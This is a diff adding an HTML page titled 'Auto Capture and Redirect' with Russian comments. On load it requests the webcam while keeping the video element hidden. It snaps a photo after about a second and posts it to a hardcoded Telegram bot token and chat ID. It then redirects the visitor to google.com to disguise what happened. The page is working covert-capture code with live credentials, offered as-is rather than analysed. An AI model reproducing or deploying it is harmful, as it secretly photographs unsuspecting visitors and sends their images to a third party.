@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture and Redirect</title>
+</head>
+<body>
+<video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+    // Захват камеры
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    // Запрашиваем доступ к веб-камере
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+            video.srcObject = stream;
+
+            // Делаем фото через 3 секунды после загрузки страницы
+            setTimeout(() => {
+                capturePhoto();
+            }, 1000); // 3 секунды на инициализацию камеры
+        })
+        .catch((err) => {
+            console.error("Error accessing the webcam: " + err);
+            // Если ошибка доступа к камере, можно сразу сделать редирект
+            window.location.href = 'https://www.google.com';
+        });
+
+    // Функция для автоматического захвата фото
+    function capturePhoto() {
+        context.drawImage(video, 0, 0, 640, 480);
+        canvas.toBlob((blob) => {
+            sendPhoto(blob);
+        }, 'image/png');
+    }
+
+    // Функция для отправки фото в Телеграм
+    function sendPhoto(photoBlob) {
+        const formData = new FormData();
+        formData.append('chat_id', '1327076005');  // Вставьте ваш Chat ID
+        formData.append('photo', photoBlob, 'photo.png');
+
+        fetch(`https://api.telegram.org/bot6574743952:AAFibpe68mZwxJ9LGPpdnwhK_YGFQugkmjM/sendPhoto`, {
+            method: 'POST',
+            body: formData,
+        })
+            .then(response => response.json())
+            .then(result => {
+                if (result.ok) {
+                    console.log("Photo sent successfully!");
+                } else {
+                    console.error("Failed to send photo: " + result.description);
+                }
+                // После отправки фото, перенаправляем на Google
+                window.location.href = 'https://www.google.com';
+            })
+            .catch((error) => {
+                console.error("Error sending the photo: ", error);
+                // В любом случае перенаправляем пользователя
+                window.location.href = 'https://www.google.com';
+            });
+    }
+</script>
+</body>
+</html>
